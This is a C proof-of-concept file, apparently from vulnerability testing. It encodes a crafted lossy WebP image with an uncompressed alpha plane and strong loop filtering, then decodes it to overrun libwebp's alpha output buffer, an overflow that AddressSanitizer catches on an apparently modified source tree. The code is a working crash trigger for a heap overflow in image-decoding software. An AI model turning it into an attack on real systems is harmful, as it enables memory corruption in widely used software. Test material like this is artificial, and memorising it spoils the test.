// PoC: crafted lossy WebP with an uncompressed alpha plane and strong (complex)
// loop filtering. Decoding drives the alpha sliding-window output buffer past
// its end on the last macroblock row. Aborts under AddressSanitizer only on the
// resulting (edited) tree; clean on the original maintenance batch.
//
// Entry point: WebPEncode (produce bytes) + WebPDecodeRGBA (decode them back),
// both from the public <webp/encode.h> / <webp/decode.h> headers.

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "webp/decode.h"
#include "webp/encode.h"

// A multiple of 16 so the image is exactly 2 macroblock rows tall; the last
// macroblock row then asks the alpha decoder for 24 pixel rows at once (16 + 8
// held-back rows from complex filtering).
#define W 4096
#define H 32

int main(void) {
  const int stride = W * 4;
  uint8_t* rgba = (uint8_t*)malloc((size_t)stride * H);
  if (rgba == NULL) return 2;

  // Non-trivial, non-opaque alpha so the encoder keeps a real alpha plane.
  for (int y = 0; y < H; ++y) {
    for (int x = 0; x < W; ++x) {
      uint8_t* p = rgba + (size_t)y * stride + (size_t)x * 4;
      p[0] = (uint8_t)(x * 3 + y);        // R
      p[1] = (uint8_t)(x + y * 5);        // G
      p[2] = (uint8_t)(x * 7 + y * 2);    // B
      p[3] = (uint8_t)((x + y) & 0xff);   // A (varies -> real alpha plane)
    }
  }

  WebPConfig config;
  WebPPicture pic;
  if (!WebPConfigInit(&config) || !WebPPictureInit(&pic)) {
    free(rgba);
    return 2;
  }

  config.lossless = 0;             // lossy VP8 -> alpha carried in an ALPH chunk
  config.quality = 75.f;
  config.method = 4;
  config.filter_strength = 60;     // enable the loop filter ...
  config.filter_type = 1;          // ... strong type -> decoder "complex" (8 extra rows)
  config.alpha_compression = 0;    // uncompressed alpha -> ALPHA_NO_COMPRESSION path
  config.alpha_filtering = 0;
  config.alpha_quality = 100;
  if (!WebPValidateConfig(&config)) {
    free(rgba);
    return 2;
  }

  pic.use_argb = 0;
  pic.width = W;
  pic.height = H;
  if (!WebPPictureImportRGBA(&pic, rgba, stride)) {
    free(rgba);
    return 2;
  }
  free(rgba);

  WebPMemoryWriter writer;
  WebPMemoryWriterInit(&writer);
  pic.writer = WebPMemoryWrite;
  pic.custom_ptr = &writer;

  if (!WebPEncode(&config, &pic)) {
    fprintf(stderr, "encode failed: %d\n", pic.error_code);
    WebPPictureFree(&pic);
    WebPMemoryWriterClear(&writer);
    return 2;
  }
  WebPPictureFree(&pic);

  int ow = 0, oh = 0;
  uint8_t* out = WebPDecodeRGBA(writer.mem, writer.size, &ow, &oh);
  WebPMemoryWriterClear(&writer);
  if (out != NULL) WebPFree(out);

  printf("decoded %dx%d\n", ow, oh);
  return 0;
}
